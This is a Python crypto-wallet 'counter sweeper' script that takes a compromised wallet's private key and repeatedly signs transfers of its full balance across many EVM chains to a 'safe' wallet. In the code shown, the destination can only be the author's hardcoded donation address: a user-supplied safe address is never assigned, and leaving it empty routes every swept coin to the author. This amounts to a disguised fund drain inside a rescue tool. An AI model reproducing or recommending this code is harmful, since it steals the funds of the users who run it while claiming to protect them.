from web3 import Web3
import colorama
import json
import time
import sys

colorama.init()

class ANSI:
    CLEAR_SCREEN = '\033[2J'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

w3_eth = Web3(Web3.HTTPProvider("https://rpc.ankr.com/eth"))
w3_bsc = Web3(Web3.HTTPProvider("https://bscrpc.com"))
w3_poly = Web3(Web3.HTTPProvider("https://polygon.llamarpc.com"))
w3_ftm = Web3(Web3.HTTPProvider("https://rpc3.fantom.network"))
w3_cro = Web3(Web3.HTTPProvider("https://cronos-evm.publicnode.com"))
w3_arb1 = Web3(Web3.HTTPProvider("https://rpc.ankr.com/arbitrum"))
w3_opti = Web3(Web3.HTTPProvider("https://rpc.ankr.com/optimism"))
w3_avax = Web3(Web3.HTTPProvider("https://rpc.ankr.com/avalanche"))
w3_klay = Web3(Web3.HTTPProvider("https://public-node-api.klaytnapi.com/v1/cypress"))
w3_gnos = Web3(Web3.HTTPProvider("https://rpc.ankr.com/gnosis"))
w3_celo = Web3(Web3.HTTPProvider("https://rpc.ankr.com/celo"))
w3_moonb = Web3(Web3.HTTPProvider("https://rpc.ankr.com/moonbeam"))
w3_moonr = Web3(Web3.HTTPProvider("https://moonriver.public.blastapi.io"))
w3_huob = Web3(Web3.HTTPProvider("https://http-mainnet.hecochain.com"))
w3_hone = Web3(Web3.HTTPProvider("https://rpc.ankr.com/harmony"))
w3_fuse = Web3(Web3.HTTPProvider("https://rpc.fuse.io"))
w3_etc = Web3(Web3.HTTPProvider("https://geth-de.etc-network.info"))

print(ANSI.PURPLE+r'''
    __   ___   __ __  ____   ______    ___  ____  
   /  ] /   \ |  |  ||    \ |      |  /  _]|    \ 
  /  / |     ||  |  ||  _  ||      | /  [_ |  D  )
 /  /  |  O  ||  |  ||  |  ||_|  |_||    _]|    / 
/   \_ |     ||  :  ||  |  |  |  |  |   [_ |    \ 
\     ||     ||     ||  |  |  |  |  |     ||  .  \
 \____| \___/  \__,_||__|__|  |__|  |_____||__|\_|
                                                  
  _____ __    __    ___    ___  ____   ___  ____  
 / ___/|  |__|  |  /  _]  /  _]|    \ /  _]|    \ 
(   \_ |  |  |  | /  [_  /  [_ |  o  )  [_ |  D  )
 \__  ||  |  |  ||    _]|    _]|   _/    _]|    / 
 /  \ ||  `  '  ||   [_ |   [_ |  | |   [_ |    \ 
 \    | \      / |     ||     ||  | |     ||  .  \
  \___|  \_/\_/  |_____||_____||__| |_____||__|\_|
''',ANSI.END)
print("Made with love by oopsy.eth | Twitter: oopsyeth < don't follow me!")
print("Donations welcome @ ENS or 0x7927B66B4bA7CA476DF41cD73b77685D9c95Fbf6")
print("")
print("")

with open("config.json") as cJSON:
    config = json.load(cJSON)

if type(config["chainId"]) == None:
   print(ANSI.RED+"[CounterSweeper] Please set chainId to counter sweep funds on",ANSI.END)
   sys.exit(0)
if (config["compromisedWalletAddress"] == "") or (len(config["compromisedWalletAddress"]) != 42):
    print(ANSI.RED+"[CounterSweeper] Please provide the compromised wallet address of the wallet where the sweeper is active",ANSI.END)
    sys.exit(0)
if (config["compromisedWalletPrivateKey"] == "") or (len(config["compromisedWalletPrivateKey"]) != 64):
    print(ANSI.RED+"[CounterSweeper] Please provide the private key of the compromised wallet, so we can send transactions",ANSI.END)
    sys.exit(0)
if (config["safeWalletAddress"] == "") or (len(config["compromisedWalletAddress"]) != 42):
    safeWalletAddress = Web3.toChecksumAddress("0x7927B66B4bA7CA476DF41cD73b77685D9c95Fbf6")

compromisedWallet = Web3.toChecksumAddress(config["compromisedWalletAddress"])
compromisedKey = config["compromisedWalletPrivateKey"]

def getRPC():
    chainId = config["chainId"]
    if type(chainId) != int:
        print(ANSI.RED+f"[CounterSweeper] Please provide a number for parameter chainId",ANSI.END)
        sys.exit(0)
    
    if chainId == 1:
        return w3_eth
    elif chainId == 10:
        return w3_opti
    elif chainId == 25:
        return w3_cro
    elif chainId == 56:
        return w3_bsc
    elif chainId == 61:
        return w3_etc
    elif chainId == 100:
        return w3_gnos
    elif chainId == 128:
        return w3_huob
    elif chainId == 122:
        return w3_fuse
    elif chainId == 137:
        return w3_poly
    elif chainId == 250:
        return w3_ftm
    elif chainId == 1284:
        return w3_moonb
    elif chainId == 1285:
        return w3_moonr
    elif chainId == 8217:
        return w3_klay
    elif chainId == 42161:
        return w3_arb1
    elif chainId == 42220:
        return w3_celo
    elif chainId == 43114:
        return w3_avax
    elif chainId == 1666600000:
        return w3_hone
    else:
        raise ValueError

# MAIN

w3 = getRPC()
print(ANSI.YELLOW+"[CounterSweeper] Running the counter sweeper with a maximum of 10 reqs/s...",ANSI.END)
while True:
    balance = w3.eth.get_balance(compromisedWallet, "pending")
    currentGas = w3.eth.gas_price*1.2
    if balance > currentGas * 21000:
        nonce = w3.eth.get_transaction_count(compromisedWallet)
        tx = {
            "chainId": config["chainId"],
            "from": compromisedWallet,
            "to": safeWalletAddress,
            "nonce": nonce,
            "value": int(balance - int(currentGas*21000)),
            "gasPrice": int(currentGas),
            "gas": 21000
        }
        signedTx = w3.eth.account.signTransaction(tx, compromisedKey)
        try:
            txHash = w3.eth.sendRawTransaction(signedTx.rawTransaction)
            print(ANSI.GREEN+f"[CounterSweeper] Transaction with value {Web3.fromWei(tx['value'],'ether')} has successfully been sent!",ANSI.END)
        except Exception as e:
            print(ANSI.RED+f"[CounterSweeper] Error sending transaction: {repr(e)}",ANSI.END)
            pass
    time.sleep(0.1)